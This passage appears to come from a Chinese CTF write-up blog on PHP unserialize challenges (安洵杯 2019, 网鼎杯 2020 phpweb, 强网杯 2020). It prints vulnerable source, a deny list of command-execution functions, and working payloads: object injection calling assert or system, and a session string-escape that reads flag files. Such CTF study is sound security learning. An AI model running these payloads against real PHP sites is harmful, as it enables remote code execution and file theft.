    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token number">2020</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">22</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">24</span></span></code></pre>

<p>简单的反序列化</p>
<p><code>__destruct</code>方法在反序列化的时候触发，里面的<code>$b($a)</code>即作为代码执行的条件，于是可以构造<code>assert(phpinfo())</code>，<code>payload</code>如下：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">HelloPhp</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'phpinfo()'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"assert"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>将结果传入<code>data</code>搜索flag即可得到flag</p>
<h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="安洵杯-2019-easy_serialize_php"></a>安洵杯-2019-easy_serialize_php</h3><p>题目给出了源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>

<span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;a href="../index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//maybe you can find something in here!</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span></code></pre>

<p>在令<code>$function == &#39;phpinfo&#39;</code>时查看<code>phpinfo()</code>内容发现存在<code>d0g3_f1ag.php</code> 文件，推测flag在其中，于是想办法构造文件读取方法</p>
<p>不难看到代码中有一个<code>extract()</code>函数，这个函数如果没设置<code>extract_rules</code>为<code>EXTR_SKIP</code> 则会覆盖原有变量</p>
<ul>
<li><strong>extract()</strong>： 函数从数组中将变量导入到当前的符号表。<a href="https://www.php.net/manual/zh/function.extract.php">参考</a></li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200515135141013.png" alt loading="lazy"></p>
<p>那么我们如果想要读取<code>d0g3_f1ag.php</code>文件的内容就需要令反序列化后的<code>$_SESSION[&#39;img&#39;]</code>为<code>d0g3_f1ag.php  =&gt;  ZDBnM19mMWFnLnBocA==</code>则初步反序列化内容<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>再看到<code>$serialize_info = filter(serialize($_SESSION));</code>，先经过序列化，然后在进行<code>filter</code>函数，也就是过滤替换操作，这样的话就很有可能会造成序列化字符串逃逸的问题，于是构造利用payload：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagphpphp<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>由于<code>_SESSION</code>数组有3个值，则需要在后面补充随便一个值即可</p>
<p>传入后<code>$serialize_info</code>的就为以下值</p>
<pre class="language-php" data-language="php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">";s:3:"</span>img<span class="token string double-quoted-string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string double-quoted-string">";&#125; "</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p><code>user</code>闭合<code>&quot;;s:8:&quot;function&quot;;s:34:</code>，随后再读取<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>，随后大括号闭合，后面的<code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>值丢弃</p>
<p>读取到<code>d0g3_f1ag.php</code> 内容为</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag in /d0g3_fllllllag'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>再依法读取<code>/d0g3_fllllllag</code>即可</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagphpphp<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"L2QwZzNfZmxsbGxsbGFn"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>题目每隔一段时间都会自动发一个包刷新一下网页，抓包下来看看发来了啥数据</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625154555825.png" alt loading="lazy"></p>
<p>测试后报错得到函数调用了<code>call_user_func()</code>函数，该函数把第一个参数作为回调函数调用，也就是说这个数据包调用了date函数，传入了后面为p的参数，并且执行了函数输出了结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155114637.png" alt loading="lazy"></p>
<p>于是用<code>system</code>函数测试命令执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155200767.png" alt loading="lazy"></p>
<p>被过滤了，于是直接将<code>index.php</code>的源码读取出来(读根目录没有flag)，<code>func=readfile&amp;p=index.php</code>，得到源码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passthru"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_open"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"show_source"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"popen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dl"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"touch"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"array_map"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uasort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uksort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fopen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fwrite"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>果不其然过滤了很多命令执行的函数，用的<code>in_array</code>函数进行对比，但是可以看到改函数的<code>Test</code>方法，里面也调用了<code>gettime</code>方法，于是构造反序列化利用</p>
<p>exp：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"find / -name *flag*"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">19</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"find / -name *flag*"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre>

<p>传入找到flag所在的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155712200.png" alt loading="lazy"></p>
<p>尝试读取</p>
<pre class="language-php" data-language="php"><code class="language-php">func<span class="token operator">=</span>unserialize<span class="token operator">&amp;</span>p<span class="token operator">=</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Test"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"cat /tmp/flagoefiu4r93"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>

<p>得到flag</p>
<h3 id="2020-第四届-强网杯-web辅助"><a href="#2020-第四届-强网杯-web辅助" class="headerlink" title="[2020 第四届 强网杯]-web辅助"></a>[2020 第四届 强网杯]-web辅助</h3><p>题目给出了源码，挑重点看：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">player</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pass</span> <span class="token operator">=</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">topsolo</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Riven'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"function"</span> <span class="token keyword">or</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"object"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
            <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">midsolo</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
